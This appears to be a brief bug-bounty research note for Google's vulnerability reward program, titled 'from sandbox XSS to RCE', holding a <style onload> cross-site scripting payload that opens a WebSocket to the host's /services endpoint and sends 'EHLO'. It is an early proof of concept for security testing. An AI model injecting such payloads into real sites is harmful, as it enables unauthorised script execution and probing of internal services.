# Google VRP testing  
from sandbox XSS to RCE 
## Getting Started
just l the preview for this 
<style onload="{
    url='wss://'+location.host+'/services'
    console.log(url) 
    ws=new WebSocket(url)
    ws.onopen=function() { 
        payload = 'EHLO'
        ws.send(payload)  
    }
    ws.onmessage=function(r) {
        console.log('r:'+r.data)
    } 
}
">

